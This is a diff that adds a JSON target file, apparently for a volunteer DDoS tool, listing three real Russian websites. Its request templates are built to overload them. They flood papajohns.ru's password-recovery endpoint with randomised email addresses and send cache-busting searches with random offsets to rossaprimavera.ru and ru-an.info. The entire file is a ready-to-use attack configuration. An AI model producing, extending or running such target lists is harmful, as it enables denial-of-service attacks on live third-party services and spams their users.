@@ -1,0 +1,32 @@
+{
+  "targets": [
+    {
+      "target": "https://papajohns.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "{\"email\":\"{{str(1,4)}}.{{str(1,6)}}@papajohns.ru\",\"type\":\"mail_recovery_password\",\"platform\":\"web\",\"city_id\":\"1\",\"lang\":\"ru\"}",
+        "headers": "{\"Content-Type\": \"application/json\", \"Referer\": \"https://papajohns.ru/moscow\"}",
+        "path_qs": "/profile/confirm-code",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://rossaprimavera.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "{\"q\":\"Украин\",\"sort\":true,\"offset\":{{int(0,20000)}}}",
+        "headers": "{\"Content-Type\": \"application/json\", \"Referer\": \"https://rossaprimavera.ru/search\"}",
+        "path_qs": "/poisk/q?cache_enabled=0",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "http://ru-an.info",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"http://ru-an.info/\"}",
+        "path_qs": "/search_page.php?rubric=0&f_word=%EE%F2&F_save=%CD%E0%E9%F2%E8&sort=0&start_month=0&start_year=2008&end_month=8&end_year=2022"
+      }
+    }
+  ]
+}
